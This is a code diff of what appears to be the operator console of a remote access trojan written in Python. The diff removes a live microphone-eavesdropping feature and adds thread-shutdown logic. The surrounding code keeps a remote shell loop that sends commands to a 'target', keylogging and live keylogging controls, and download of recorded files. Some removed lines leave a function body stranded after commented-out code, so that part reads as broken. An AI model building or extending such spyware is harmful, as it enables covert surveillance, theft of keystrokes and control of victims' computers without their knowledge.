@@ -128,49 +128,6 @@ def keylogging_live():
         keylog = reliable_recv()
         print(keylog) if keylog != 'end of keylogging' else None
 
-
-# def liveaudio_start():
-#     global liveaudio_status, audio_filename
-
-#     p = pyaudio.PyAudio()
-#     stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
-#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-#     sock.bind(('0.0.0.0', 7777))
-
-#     print(f"[i] This audio live-streaming session will be recorded as {audio_filename} at the end of the session")
-#     print("[+] Start listening to the target's microphone... (Press ESC to end the session)")
-
-    def check_stop_key(key):
-        global liveaudio_status, audio_filename
-
-        # Post live-audio sessions
-        if key == Key.esc:                          
-            reliable_send('liveaudio_stop')
-            listener.stop()
-            liveaudio_status = False
-            print("[+] live audio stopped.")
-
-            if audio_filename != None:
-                print("[i] Downloading the previous audio live-streaming session's .wav file...")
-                try:
-                    download_file(audio_filename,5)
-                    print(f"[+] Successfully download the previous audio live-streaming session file as {audio_filename}")
-                except:
-                    print("[-] Fail to download the previous audio live-streaming session file")
-
-            audio_filename = None
-            return
-        
-        else:
-            pass
-
-    listener = Listener(on_press=check_stop_key)
-    listener.start()
-
-    while liveaudio_status:
-        data, _ = sock.recvfrom(1024 * 2)  # 2 bytes per sample (16-bit)
-        stream.write(data)
-
 # --- Global Flag to Stop Threads ---
 stop_threads = False
 
@@ -245,13 +202,15 @@ def audio_reception_thread():
 
 # Function for the main communication loop with the target
 def target_communication():
-    global keylogging_filename, keylogging_status, liveaudio_status, audio_filename, livekeylogging_status
+    # global keylogging_filename, keylogging_status, liveaudio_status, audio_filename, livekeylogging_status
+    global keylogging_filename, keylogging_status,  livekeylogging_status, stop_threads
 
-    while True:
+    while not stop_threads:
         command = input('* Shell~%s: ' % str(ip))
         reliable_send(command)
 
         if command == 'quit':
+            stop_threads = True
             break
 
         elif command == 'clear':
@@ -275,18 +234,6 @@ def target_communication():
         elif command[:15] == 'keylogging_stop':
             keylogging_stop()
 
-        elif command[:15] == 'liveaudio_start':
-            if not liveaudio_status:
-                filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')
-
-                if len(command) > 16:
-                    audio_filename = filename if (filename != "") else 'liveaudio.wav'       # audio_filename = filename if (len(command) > 16 and filename != "") else None
-
-                liveaudio_status = True
-                liveaudio_start()
-            else:
-                print('[!] Live audio is already running.')
-
         elif command[:15] == 'keylogging_live':
             if not livekeylogging_status:
                 filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')
@@ -308,14 +255,17 @@ def target_communication():
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
+            if result is None:
+                stop_threads = True
+                break
             print(result)
 
 
 # Initialize live audio status as False
-livekeylogging_status, liveaudio_status = False, False
+livekeylogging_status  = False
 
 # Initialize keylogging filename as None
-audio_filename, keylogging_filename = None, None
+keylogging_filename =  None
 
 # Initialize keylogging status as False
 keylogging_status = False 
